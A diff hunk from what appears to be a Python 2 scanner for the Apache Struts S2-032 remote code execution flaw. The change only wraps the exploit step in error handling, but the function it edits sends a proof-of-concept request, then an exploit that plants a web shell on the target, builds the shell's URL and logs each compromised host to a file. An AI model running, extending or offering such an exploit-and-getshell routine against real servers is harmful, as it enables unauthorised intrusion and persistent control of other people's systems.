@@ -768,12 +768,16 @@ def checkS2032(url):
     try:
         result = exploitS2032(poc)
         if "Local Address" in result:
-            shell_path = exploitS2032(exp).strip()
-            reg = '(http[s]*://[^/]*/?).*$'
-            m = re.search(reg,url)
-            if m:
-                url_path=m.group(1)
-            shell_file = url_path+shellname
+            try:
+            	shell_path = exploitS2032(exp).strip()
+            	reg = '(http[s]*://[^/]*/?).*$'
+            	m = re.search(reg,url)
+            	if m:
+            	    url_path=m.group(1)
+            	    shell_file = url_path+shellname
+            except Exception, e:
+            	shell_path = "failed to getshell"
+            	shell_file = "failed to getshell"
             vuls='[+] vuls found! url: '+url+', shell_path: '+ shell_path +', shell_file: '+shell_file
             logfile(vuls,'s2032_rce.txt')
             print vuls
